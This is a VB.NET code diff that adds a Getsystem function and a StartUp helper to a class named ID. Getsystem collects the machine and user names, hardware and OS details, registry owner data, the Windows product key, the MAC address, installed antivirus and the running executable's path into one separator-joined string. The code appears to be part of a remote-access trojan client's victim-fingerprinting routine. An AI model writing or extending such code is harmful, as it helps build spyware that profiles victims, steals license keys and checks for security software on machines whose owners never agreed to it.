@@ -296,4 +296,47 @@ Public Class ID
         Return StrReverse(KEYSTRING)
 
     End Function
+
+    Public Shared Function Getsystem() As String
+        Try
+            Return SystemInformation.ComputerName.ToString() & Main.SPL &
+                SystemInformation.UserName.ToString() & Main.SPL &
+                SystemInformation.VirtualScreen.Width & Main.SPL &
+                SystemInformation.VirtualScreen.Height & Main.SPL &
+                FormatNumber(My.Computer.Info.AvailablePhysicalMemory / 1024 / 1024 / 1024, 2) & " GB|" & Main.SPL &
+                FormatNumber(My.Computer.Info.AvailableVirtualMemory / 1024 / 1024 / 1024, 2) & " GB|" & Main.SPL &
+                My.Computer.Info.OSFullName & Main.SPL &
+                My.Computer.Info.OSPlatform & Main.SPL &
+                My.Computer.Info.OSVersion & Main.SPL &
+                FormatNumber(My.Computer.Info.TotalPhysicalMemory / 1024 / 1024 / 1024, 2) & " GB|" & Main.SPL &
+                FormatNumber(My.Computer.Info.TotalVirtualMemory / 1024 / 1024 / 1024, 2) & " GB|" & Main.SPL &
+                SystemInformation.PowerStatus.BatteryChargeStatus.ToString() & Main.SPL &
+                SystemInformation.PowerStatus.BatteryFullLifetime.ToString() & Main.SPL &
+                SystemInformation.PowerStatus.BatteryLifePercent.ToString() & Main.SPL &
+                SystemInformation.PowerStatus.BatteryLifeRemaining.ToString() & Main.SPL &
+               CPU() & Main.SPL & GPU() & Main.SPL &
+                "(Started: " & StartUp() & ") & (Uptime: " & LastReboot() & ")" & Main.SPL &
+            My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "RegisteredOwner", "N/A") & Main.SPL &
+            My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "RegisteredOrganization", "N/A") & Main.SPL &
+            WinKey() & Main.SPL &
+            Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces()(0).GetPhysicalAddress().ToString & Main.SPL &
+            AV() & Main.SPL &
+            Application.ExecutablePath
+        Catch
+            Return "N/A"
+        End Try
+    End Function
+
+    Public Shared Function StartUp() As String
+        Try
+            Dim StartDate As DateTime
+            Dim envTicks As Long = Environment.TickCount
+            Dim msToAdd As Long = envTicks - (envTicks * 2)
+            StartDate = DateTime.Now.AddMilliseconds(msToAdd)
+            Return StartDate.ToString
+        Catch
+            Return Nothing
+        End Try
+    End Function
+
 End Class
